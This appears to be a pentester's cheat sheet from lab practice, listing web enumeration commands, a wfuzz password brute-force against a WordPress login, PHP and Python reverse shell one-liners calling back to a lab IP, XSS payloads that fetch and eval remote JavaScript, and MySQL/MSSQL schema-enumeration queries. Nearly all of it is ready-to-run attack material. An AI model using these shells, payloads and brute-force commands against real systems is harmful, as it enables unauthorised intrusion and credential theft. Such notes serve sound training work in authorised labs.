# Enumeration

```
nmap -p80 -sV --script=http-methods,http-ls,http-robots.txt,http-cookie-flags,http-cors $IP
```

```
sudo cewl -d 2 -m 5 -w ourWordlist.txt www.MegaCorpOne.com
```

```
gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -t 5 -b 301
gobuster dns -d megacorpone.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
```

```
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 301,404,403 http://offsecwp:80/FUZZ
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404,301 http://offsecwp:80/index.php/?FUZZ=data
wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS-Fuzzing --hc 301,404 http://offsecwp:80/index.php/?xss=FUZZ
wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404 -d "log=admin&pwd=FUZZ" --hh 6059 "$URL"
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -b $COOKIE --hc 301,404,403 http://offsecwp:80/wp-admin/FUZZ
```

```
cat urls.txt | hakrawler
```

# Reverse shell

```
#hasnt worked
$sock=fsockopen("192.168.45.5",1337);exec("/bin/sh -i <&3 >&3 2>&3");

#works
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.5",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

# XSS

```
<script src="http://192.168.45.5:9000/xss.js"></script>
<img src='x' onerror='fetch("http://192.168.49.52:9000/xss.js").then(function(t){return t.text()}).then(function(v){eval(v)})'>
```

# SQL

## MySQL

```
select version();
select current_user();
show databases;
show tables;
select table_schema from information_schema.tables group by table_schema;
select table_name from information_schema.tables where table_schema = 'app';
select column_name, data_type from information_schema.columns where table_schema = 'app' and table_name = 'menu';
```

## MSSQL
```
select @@version;
select SYSTEM_USER;
SELECT name FROM sys.databases;
select * from app.information_schema.tables;
select COLUMN_NAME, DATA_TYPE from app.information_schema.columns where TABLE_NAME = 'menu';
